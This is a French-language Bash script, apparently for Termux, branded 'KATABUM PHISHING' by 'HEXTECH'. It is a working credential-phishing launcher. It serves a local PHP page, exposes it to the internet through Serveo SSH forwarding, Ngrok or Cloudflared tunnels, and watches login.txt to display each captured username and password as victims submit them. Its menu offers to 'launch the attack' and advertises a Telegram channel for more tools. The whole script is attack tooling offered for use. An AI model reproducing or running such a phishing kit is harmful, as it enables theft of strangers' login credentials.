#!/bin/bash

# Couleurs
BLEU='\033[1;34m'
JAUNE='\033[1;33m'
ROUGE='\033[1;31m'
VERT='\033[1;32m'
NC='\033[0m' # Pas de couleur

# Fonction pour surveiller et afficher les données PHP
surveiller_donnees() {
    echo -e "${VERT}[•] Surveillance des données PHP...${NC}"
    echo -e "${VERT}Appuyez sur Ctrl+C pour arrêter la surveillance${NC}"
    
    # Vérifier si le fichier login.txt existe
    if [ ! -f login.txt ]; then
        touch login.txt
    fi
    
    # Afficher le contenu initial
    if [ -s login.txt ]; then
        echo -e "${JAUNE}Données actuelles :${NC}"
        cat login.txt
    else
        echo -e "${JAUNE}Aucune donnée pour le moment. En attente...${NC}"
    fi
    
    # Surveiller les modifications du fichier
    tail -f login.txt | while read -r ligne; do
        if [[ "$ligne" == *"Username:"* ]]; then
            echo -e "${VERT}\n[✓] Nouvelle connexion détectée :${NC}"
            echo -e "${BLEU}$ligne${NC}"
            read -r ligne # Lire le mot de passe
            echo -e "${BLEU}$ligne${NC}"
            echo -e "${JAUNE}En attente des autres utilisateurs...${NC}"
        fi
    done
}

# Fonction pour démarrer le serveur PHP
demarrer_serveur_php() {
    echo -e "${BLEU}[•] Démarrage du serveur PHP...${NC}"
    php -S localhost:3000 > /dev/null 2>&1 & # Lancer le serveur en arrière-plan
    sleep 2 # Attendre que le serveur démarre
    surveiller_donnees & # Démarrer la surveillance en arrière-plan
}

# Fonction pour télécharger et installer Ngrok
installer_ngrok() {
    echo -e "${JAUNE}[•] Téléchargement de Ngrok pour ARM64...${NC}"

    # URL spécifique pour ARM64
    ngrok_url="https://github.com/inconshreveable/ngrok/releases/download/2.2.8/ngrok-arm64.zip"

    # Télécharger Ngrok
    if wget -O ngrok.zip "$ngrok_url"; then
        echo -e "${BLEU}[✓] Ngrok téléchargé avec succès.${NC}"
    else
        echo -e "${ROUGE}[!] Échec du téléchargement de Ngrok. Vérifiez votre connexion internet.${NC}"
        exit 1
    fi

    # Extraire et déplacer Ngrok
    if unzip ngrok.zip; then
        mkdir -p ~/bin/ # Créer un répertoire local pour les binaires
        mv ngrok ~/bin/ || { echo -e "${ROUGE}[!] Impossible de déplacer Ngrok vers ~/bin/"; exit 1; }
        echo -e "${BLEU}[✓] Ngrok installé dans ~/bin/${NC}"
        rm ngrok.zip
        export PATH=$PATH:~/bin/ # Ajouter ~/bin au PATH
    else
        echo -e "${ROUGE}[!] Échec de l'extraction de Ngrok. Vérifiez le fichier téléchargé.${NC}"
        rm ngrok.zip
        exit 1
    fi
}

# Fonction pour générer un lien avec Ngrok
generer_lien_ngrok() {
    echo -e "${JAUNE}[•] Démarrage de Ngrok...${NC}"
    if ! command -v ngrok &> /dev/null; then
        installer_ngrok
    fi
    ~/bin/ngrok http 3000 || { # Exécuter Ngrok depuis ~/bin
        echo -e "${ROUGE}[!] Une erreur s'est produite lors du lancement de Ngrok.${NC}"
        exit 1
    }
}

# Fonction pour générer un lien avec Serveo
generer_lien_serveo() {
    echo -e "${JAUNE}HEXTECH 🦠 [*] Connexion à Serveo pour générer un lien public...${NC}"
    ssh -R 80:localhost:3000 serveo.net -p 22 || {
        echo -e "${ROUGE}[!] Échec de la connexion à Serveo. Vérifiez votre connexion internet.${NC}"
    }
}

# Fonction pour générer un lien avec une méthode alternative (Cloudflared)
generer_lien_autre() {
    echo -e "${JAUNE}[•] Démarrage avec une autre méthode (ex : Cloudflared)...${NC}"
    if ! command -v cloudflared &> /dev/null; then
        echo -e "${ROUGE}[!] Cloudflared n'est pas installé. Installation en cours...${NC}"
        pkg install cloudflared -y
    fi
    cloudflared tunnel --url http://localhost:3000 || {
        echo -e "${ROUGE}[!] Une erreur s'est produite lors du lancement de Cloudflared.${NC}"
        exit 1
    }
}

# Vérification si SSH et PHP sont installés
if ! command -v ssh &> /dev/null; then
    echo -e "${ROUGE}[!] SSH n'est pas installé. Installation en cours...${NC}"
    pkg install openssh -y
fi

if ! command -v php &> /dev/null; then
    echo -e "${ROUGE}[!] PHP n'est pas installé. Installation en cours...${NC}"
    pkg install php -y
fi

# Menu principal
clear
echo -e "\033[1;36m"  # Cyan brillant
echo -e "=========================================="
echo -e "   ██╗  ██╗███████╗██╗  ██╗████████╗███████╗ ██████╗██╗  ██╗"
echo -e "   ██║  ██║██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔════╝██║  ██║"
echo -e "   ███████║█████╗   ╚███╔╝    ██║   █████╗  ██║     ███████║"
echo -e "   ██╔══██║██╔══╝   ██╔██╗    ██║   ██╔══╝  ██║     ██╔══██║"
echo -e "   ██║  ██║███████╗██╔╝ ██╗   ██║   ███████╗╚██████╗██║  ██║"
echo -e "   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝╚═╝  ╚═╝"
echo -e "=========================================="
echo -e "\033[0m"
echo -e "=========================================="
echo -e "         🇨🇩 KATABUM PHISHING         "
echo -e "=========================================="
echo -e "${NC}"

echo -e "${JAUNE}1. Passer à l'attaque${NC}"
echo -e "${JAUNE}2. Rejoindre notre canal Telegram pour plus d'outils${NC}"

# Lecture du choix utilisateur
read -p "Choisissez une option (1 ou 2) : " choix

if [ "$choix" == "1" ]; then
    echo -e "${JAUNE}Choisissez une méthode pour générer un lien public :${NC}"
    echo -e "${BLEU}1. Serveo${NC}"
    echo -e "${BLEU}2. Ngrok${NC}"
    echo -e "${BLEU}3. Méthode alternative (ex : Cloudflared)${NC}"
    read -p "Votre choix (1, 2 ou 3) : " methode

    # Démarrer le serveur PHP
    demarrer_serveur_php

    case "$methode" in
        1) generer_lien_serveo ;;
        2) generer_lien_ngrok ;;
        3) generer_lien_autre ;;
        *) echo -e "${ROUGE}Option invalide. Retour au menu principal...${NC}" ;;
    esac

elif [ "$choix" == "2" ]; then
    echo -e "${BLEU}Ouverture de notre canal Telegram...${NC}"
    termux-open-url "https://t.me/hextechcar"
else
    echo -e "${ROUGE}Option invalide. Quitter...${NC}"
fi
